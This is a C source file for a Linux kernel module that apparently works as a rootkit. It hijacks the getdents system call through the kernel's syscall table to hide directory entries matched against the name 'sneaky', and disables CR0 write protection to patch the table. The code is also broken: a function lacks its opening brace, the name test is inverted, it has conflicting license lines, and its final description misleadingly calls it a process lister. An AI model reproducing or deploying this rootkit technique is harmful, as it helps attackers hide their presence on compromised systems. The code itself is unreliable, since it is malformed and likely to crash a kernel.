#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <asm/special_insns.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yann KOETH");
MODULE_DESCRIPTION("Loadable Kernel Module Syscall");
MODULE_VERSION("0.1");

#define SYS_CALL_TABLE "sys_call_table"
#define sys_getdents __NR_getdents
#define WRITE_PROTECT_FLAG	(1<<16)
#define sneak_phrase "sneaky"
#define MODULE_NAME  "sneaky"
unsigned long* syscall_table;
struct linux_dirent{
  unsigned long d_ino;
  unsigned long d_off;
  unsigned short d_reclen;
  char d_name[1];

};

typedef asmlinkage long (*originalGetDentsA) (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count);
originalGetDentsA originalGetDents=NULL;

asmlinkage long* hijackgetdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
    struct linux_dirent *hijackedDirent;
    char* fileNames;
    long original = originalGetDents(fd, dirp, count);

    if (original<= 0){
      return original;
    }

    //creates buffer for custom kernel module
    char* hijackedBuffer= (char*)dirp;

    int counter=0;
    while(counter<original){
        hijackedDirent=(struct linux_dirent*)(hijackedBuffer+counter);
        if((strncmp(hijackedDirent->d_name,sneak_phrase, (sizeof(sneak_phrase)-1)))){
        memcpy(hijackedBuffer+counter, hijackedBuffer+counter+hijackedDirent->d_reclen, original-(counter+hijackedDirent->d_reclen));
        original = original-hijackedDirent->d_reclen;
    }
      else{
        counter = counter + hijackedDirent->d_reclen;
      }
    }

return original;

}

static int init_syscall(void)

        // allows us access to kernel
        syscall_table = (unsigned long *)kallsyms_lookup_name(SYS_CALL_TABLE);
        originalGetDents =syscall_table[sys_getdents];
        //loads our module into the kernel
        syscall_table[sys_getdents]=(unsigned long*) hijackgetdents;
        printk(KERN_INFO "Custom syscall loaded\n");

         printk(KERN_INFO "New syscall in place\n");
         printk(KERN_INFO "New proc/modules read in place\n");

        return 0;
}

static void cleanup_syscall(void)
{

        printk(KERN_INFO "superhide leaving\n");
        // allow us to write to read onlu pages
        write_cr0(read_cr0() & (~WRITE_PROTECT_FLAG));
        // set getdents handler back
        syscall_table[sys_getdents]=(*originalGetDents);
        printk(KERN_INFO "Syscall at offset %d : %p\n", sys_getdents, (void *)syscall_table[sys_getdents]);
        printk(KERN_INFO "Custom syscall unloaded\n");
	       // turn write protect back on
         write_cr0(read_cr0() | WRITE_PROTECT_FLAG);

        return 0;
}

module_init(init_syscall);
module_exit(cleanup_syscall);


MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("A kernel module to list process by their names");
